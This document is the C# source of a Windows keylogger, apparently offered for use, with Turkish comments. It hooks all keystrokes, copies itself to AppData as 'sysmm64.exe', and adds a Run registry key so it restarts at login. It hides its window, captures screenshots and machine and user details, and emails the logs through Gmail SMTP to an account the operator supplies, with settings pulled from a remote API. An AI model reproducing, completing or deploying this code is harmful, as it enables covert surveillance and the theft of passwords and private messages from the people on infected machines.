using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using Microsoft.Win32;
using System.Security.AccessControl;
using System.Threading;
using System.Net.Mime;
using System.Net;
using System.Drawing.Imaging;
using System.Security.Permissions;
using System.Net.NetworkInformation;
using BasicJsonParser;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        string urlAPI = ""; //Your API's url.
        WebRequest wReq;
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        MailMessage ePosta = new MailMessage();
        MailMessage _con   = new MailMessage();
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        GlobalKeyboardHook gHook;
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        //~~~~~~~~Default values...
        string keyLoggerName    = "sysmm64.exe";
        string outputFile       = "output.txt";
        string screenShotFile   = "screenshot.jpeg";
        string mailAddress      = ""; //Your Gmail Account.
        string mailPassword     = ""; //Your Gmail Accounts pass        
	string mailHost         = "smtp.gmail.com";
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        string directory    = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string keyBuffer;           //load olduğunda savefile i sil varsa.
        bool isConnected    = false;
        int time            = 0;    //gönderme sürelerini api ile çek
        int saveFileTime    = 240; //per second
        int sendMailTime    = 300; //per second
        int connectAPITime  = 120; //per second
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public Form1()
        {  
            InitializeComponent();
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        private void Form1_Load(object sender, EventArgs e)
        {
            keyBuffer += getFirstValues();
            
            gHook = new GlobalKeyboardHook();
            gHook.hook();
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);

            copyExe();
            tmrKeyLogger.Start();
            tmrPing.Start();
            goForm();
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void connectAPI()
        {
            wReq = HttpWebRequest.Create(urlAPI);
            WebResponse wRes;

            string jsonData;
            
            try
            {
                wRes = wReq.GetResponse();

                StreamReader data = new StreamReader(wRes.GetResponseStream());
                jsonData = data.ReadToEnd();
               
                basicJsonParser jsonParser = new basicJsonParser(jsonData);
                //connectAPI ye seri bağlanıp jsonData eşit değilse kouşulu koyarak mail gönder!!!
                
                keyLoggerName       = jsonParser["keyLoggerName"].ToString();
                screenShotFile      = jsonParser["screenShotFile"].ToString();
                outputFile          = jsonParser["outputFile"].ToString();
                mailAddress         = jsonParser["mailAddress"].ToString();
                mailPassword        = jsonParser["mailPassword"].ToString();
                mailHost            = jsonParser["mailHost"].ToString();
            }
            catch (Exception)
            {
            }
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public string getFirstValues()
        {
            string targetComputer = "";
            targetComputer += "\n" + "---------------------------------------------------------";
            targetComputer += "\n" + "DateTimeNow        : " + DateTime.Now; 
            targetComputer += "\n" + "TickCount          : " + tickCount();
            targetComputer += "\n" + "MachineName        : " + Environment.MachineName;
            targetComputer += "\n" + "UserDomainName     : " + Environment.UserDomainName;
            targetComputer += "\n" + "UserName           : " + Environment.UserName;
            targetComputer += "\n" + "OSVersion          : " + Environment.OSVersion;
            targetComputer += "\n" + "Version            : " + Environment.Version;
            targetComputer += "\n" + "ActiveAppTitle     : " + activeAppTitle();
            targetComputer += "\n" + "---------------------------------------------------------";
            targetComputer += signature();

            return targetComputer;
        } 
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public string signature()
        {
            return "\n" + "----------------------------------------<sysMM64.exe :~)>" + "\n\n";
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public string tickCount()
        {
            string total="";
            total+= Convert.ToString(Environment.TickCount / 86400000) + "D-";
            total+= Convert.ToString(Environment.TickCount / 3600000 % 24) + "H-";
            total+= Convert.ToString(Environment.TickCount / 120000 % 60) + "M-";
            total+= Convert.ToString(Environment.TickCount / 1000 % 60) + "S";
            return total;
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void goForm()
        {
            Form2 a = new Form2();
            a.Show();
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void copyExe()
        {
            try
            {
                if (!File.Exists(directory + "\\" + keyLoggerName))
                {
                    File.Copy(Path.GetFileName(Application.ExecutablePath), directory + "\\" + keyLoggerName);
                    string runKeyBase = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\";
                    RegistryKey key = Registry.CurrentUser.OpenSubKey(runKeyBase, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl);
                    RegistryKey runKey = Registry.CurrentUser.CreateSubKey(runKeyBase);
                    runKey.SetValue(keyLoggerName, directory + "\\" + keyLoggerName);
                    runKey.Close();
                }
            }
            catch (Exception) 
            {
                //Gerekirse sadece currentusera değil localmachine de ekle.
            }
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public string getScreenShot()
        { 
            Bitmap screenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics GFX = Graphics.FromImage(screenShot);
            GFX.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            screenShot.Save(directory + "\\" +screenShotFile, ImageFormat.Jpeg);
            return screenShotFile;
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void createMail(string _keyBuffer)
        {
            ePosta = new MailMessage();
            ePosta.From = new MailAddress(mailAddress);
            ePosta.To.Add(mailAddress);

            ePosta.Attachments.Add(new Attachment(directory + "\\" + outputFile));
            ePosta.Attachments.Add(new Attachment(getScreenShot()));
            ePosta.Subject = keyLoggerName;
            ePosta.Body = getFirstValues();
            sendMail(ePosta);
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public bool sendMail(MailMessage ePosta)
        {
            SmtpClient smtp = new SmtpClient();
            smtp.Credentials = new System.Net.NetworkCredential(mailAddress, mailPassword);
            smtp.Port = 587;
            smtp.Host = mailHost;
            smtp.EnableSsl = true;

            try
            {
                smtp.SendAsync(ePosta, (object)ePosta);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            keyBuffer += ((char)e.KeyValue).ToString();
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void saveFile(string log)
        {
            ePosta.Dispose(); //Dispose edilmez ise, diğer eposta açık gibi görülür ve 2. epostadan itibaren hata verir.
            string path = directory + "\\" + outputFile;
            FileStream file = new FileStream(path, FileMode.Append, FileAccess.Write);
            
            using (StreamWriter sw = new StreamWriter(file))
            {
                sw.Write(log);
            }

            keyBuffer = "";
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public static string activeAppTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            
            int lenght = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);

            if (lenght <= 0 || lenght > sbTitle.Length) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        private void tmrKeyLogger_Tick(object sender, EventArgs e)
        {
            try
            {
                if (time == 0)
                    Form1.ActiveForm.Hide();  
            }
            catch (Exception)
            {
            }

            if (time == saveFileTime)
            {
                saveFile(keyBuffer);
            }

            if (isConnected && time == connectAPITime)
            {
                connectAPI();
            }

            if (isConnected && (time == sendMailTime))
            {
                createMail(keyBuffer);
                time = 0;
            }

            time++;
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public bool isNetConnected()
        {
                try
                {
                    System.Net.WebRequest myRequest = System.Net.WebRequest.Create("http://www.google.com");
                    System.Net.WebResponse myResponse = myRequest.GetResponse();
                    return true;
                }
                catch (System.Net.WebException)
                {
                    return false;
                }
            //return new Ping().Send("wwww.facebook.com", 1000).Status == System.Net.NetworkInformation.IPStatus.Success;
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        public void connectMail()
        {
            _con = new MailMessage();
            _con.From = new MailAddress(mailAddress);
            _con.To.Add(mailAddress);
            _con.Subject = keyLoggerName;
            _con.Body = "Connection has been established with " + Environment.MachineName + signature();
            
            sendMail(_con);
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        private void tmrPing_Tick(object sender, EventArgs e)
        {
            isConnected = isNetConnected();
            if (isConnected)
            {
                tmrPing.Stop();
                connectAPI();   //Önce API cagirilir cunku 
                connectMail();  //degisken isimleri boylece degismis olur.
            }
        }
        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~        
    }
}
